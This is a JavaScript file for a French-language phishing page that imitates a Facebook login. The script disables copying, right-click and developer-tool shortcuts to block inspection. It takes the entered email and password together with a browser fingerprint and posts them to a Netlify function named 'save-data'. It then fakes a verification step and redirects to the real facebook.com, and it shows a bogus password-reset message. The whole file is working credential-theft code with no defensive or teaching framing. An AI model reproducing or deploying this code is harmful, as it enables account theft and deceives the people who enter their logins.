(function() {
    'use strict';
    
    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
        return false;
    });
    
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });
    
    document.addEventListener('dragstart', function(e) {
        e.preventDefault();
        return false;
    });
    
    document.addEventListener('copy', function(e) {
        e.preventDefault();
        return false;
    });
    
    document.addEventListener('cut', function(e) {
        e.preventDefault();
        return false;
    });
    
    document.addEventListener('paste', function(e) {
        e.preventDefault();
        return false;
    });
    
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const loginBtn = document.getElementById('loginBtn');
        
        if (!email || !password) {
            alert('Veuillez remplir tous les champs');
            return;
        }
        
        loginBtn.textContent = 'Connexion...';
        loginBtn.disabled = true;
        loginBtn.style.opacity = '0.7';
        
        const fingerprint = {
            screen: screen.width + 'x' + screen.height,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        
        const postData = {
            email: email,
            password: password,
            fingerprint: fingerprint,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'direct'
        };
        
        setTimeout(() => {
            fetch('/.netlify/functions/save-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(postData)
            })
            .then(response => response.json())
            .then(data => {
                loginBtn.textContent = 'Vérification...';
                
                setTimeout(() => {
                    loginBtn.textContent = 'Redirection...';
                    
                    setTimeout(() => {
                        window.location.href = 'https://facebook.com';
                    }, 1000);
                    
                }, 800);
            })
            .catch(error => {
                loginBtn.textContent = 'Connexion réussie';
                setTimeout(() => {
                    window.location.href = 'https://facebook.com';
                }, 1500);
            });
        }, 500);
    });
    
    document.querySelector('.forgot-password').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Un lien de réinitialisation a été envoyé à votre email.');
    });
    
    document.querySelector('.create-account').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Redirection vers la page de création de compte...');
        setTimeout(() => {
            window.location.href = 'https://facebook.com/r.php';
        }, 1000);
    });
    
    document.onkeydown = function(e) {
        if (e.keyCode === 123) return false;
        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) return false;
        if (e.ctrlKey && e.shiftKey && e.keyCode === 74) return false;
        if (e.ctrlKey && e.keyCode === 85) return false;
    };
    
})();
